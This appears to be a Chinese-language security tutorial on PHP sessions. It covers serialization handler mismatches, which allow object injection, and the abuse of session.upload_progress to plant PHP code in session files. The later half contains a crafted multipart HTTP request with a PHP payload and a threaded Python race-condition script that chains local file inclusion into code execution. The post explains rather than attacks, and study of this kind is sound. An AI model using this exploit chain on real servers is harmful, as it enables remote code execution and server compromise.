从session开始，session究竟是什么？

HTTP是一个无状态的协议，一个用户访问多次一个网站，网站怎么判断这多次访问是来自于一个用户呢？通过IP显然是不行的，因为存在共享IP的情况。

这时候，网站可以将用户的id存储在cookie中，每次用户访问的网站时浏览器将会把cookie一起发送，然后网站在数据库中进行查询，即可确定究竟是哪个用户访问了自己。

但这种方式也带来一个问题，Cookie是用户可控的，用户可以将id修改成任意其他用户的id，即可伪造身份了，这就是很多网站存在”Cookie欺骗漏洞“的原因。

所以，我们在Cookie的基础之上增加了Session这个概念：用户第一次登录网站的时候，网站生成一个随机的字符串作为Session id保存在其Cookie中，实际上真实的用户名、邮箱等信息存储在服务端，并和Session id 一一对应。这种情况下，用户下次访问网站的时候，网站根据Session id拿到用户真实的id，进一步做后续操作。

由于Session id是随机生成的字符串，不同用户之间是不知道对方的Session id 的，所以也就可以避免伪造身份的情况了。

那么，既然后端要存储用户的信息，就需要有地方存。Java Web默认情况下是在内存里维护一个哈希表，其中包含Session id和具体数据的关系，但因为内存是在进程中的，所以当重启Web容器后Session表也就失效了，所有用户都需要重新登录。

PHP将Session存储在文件中，每个session id一个文件，文件内容是序列化后的会话数据。这也就避免了重启Web容器后Session失效的问题。

php支持三种序列化方法，分别是：

- php_serialize
- php
- php_binary

其中，方法php和php_binary几乎是相同的，只是php使用‘|’作为键名与键值的分隔符，而php_binary是在第一位指定键名的长度，剩下的内容作为键值。php_serialize是5.5.4以后加入的新的序列化方法，其效果就等于直接使用php的serialize函数。

如果不指定，PHP默认使用第二种，也就是”php“作为session序列化的方法。

谈了session序列化方式，就得提及两个有趣得漏洞。

第一个漏洞是：[phpcodz/research/pch-013.md at master · 80vul/phpcodz (github.com)](https://github.com/80vul/phpcodz/blob/master/research/pch-013.md)

在设置session和读取session两个阶段，如果使用了不同的序列化方法，将会导致任意对象注入，进而导致反序列化漏洞。

这点很好理解，PHP默认的序列化方式php是不允许键名存在竖线的，而php_serialize没有这个限制。那么，如果我们设置session的时候使用了后者，我们设置了一个包含竖线的Session，而读取时使用前者，因为竖线是其中的分隔符，所以读取的时候会按照竖线分割键值，这样就破坏了原本的序列化内容，成功注入自己的对象。

默认情况下，session.use_strict_mode值是0.此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=qwer1234，PHP将会在服务器上创建一个文件：/tmp/sess_qwer1234。

这个技巧对于漏洞利用带来很大帮助，比如phpmyadmin4.8.1文件包含漏洞（CVE-2018-12613）,就是去包含session文件。

>POC：
>
>进入phpmyadmin后，执行一下`SELECT '<?=phpinfo()?>';`然后包含你自己的session文件。

但是这个技巧的实现需要满足一个条件：服务器上需要已经初始化Session。

在PHP中。通常初始化Session的操作是执行session_start()。所以我们在审计PHP代码的时候，会在一些公共文件或入口文件里看到上述代码。**那么，如果一个网站没有执行这个初始化操作，是不是就不能在服务器上创建文件了呢？**

这就是涉及到几个配置项。

session.auto_start顾名思义，如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但是默认情况下，是关闭的。

session.upload_progress最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中（包含用户可控的值），即使此时用户没有初始化session，PHP也会自动初始化session。

而且！默认情况下session.upload_progress.enabled是为on的，也就是说这个特性默认开启，非常nice。

如何利用这个特性呢？

```http
POST /test.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: multipart/form-data; boundary=--------2015270941
Cookie: PHPSESSID=aaaaaaa
Content-Length: 234

----------2015270941
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?=phpinfo()?>
----------2015270941
Content-Disposition: form-data; name="file"; filename="test.txt"

...
----------2015270941--
```

上传结束后，这个Session将会被自动清除（由session.upload_progress.cleanup定义），我们只需要条件竞争，赶在文件被清楚前利用即可。

所以，在文件包含漏洞找不到可供包含的文件时，可以利用这个技巧。

比如，目标服务器上有这样一段代码：

```solidity
    <?php
    if (isset($_GET['file'])) {
        include './' . $_GET['file'];
    }
```

用一个简单的python脚本，即可实现代码执行漏洞的利用：

```python
import io
import requests
import threading

sessid = 'ph1'


def t1(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        response = session.post(
            'http://localhost/test.php',
            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?=phpinfo()?>'},
            files={'file': ('a.txt', f)},
            cookies={'PHPSESSID': sessid}
        )


def t2(session):
    while True:
    	response = session.get(
           f'http://localhost/test.php?file=../../../../../../../../tmp/sess_{sessid}'
        	)
        print(response.text)


with requests.session() as session:
    t1 = threading.Thread(target=t1, args=(session, ))
    t1.daemon = True
    t1.start()

    t2(session)
```

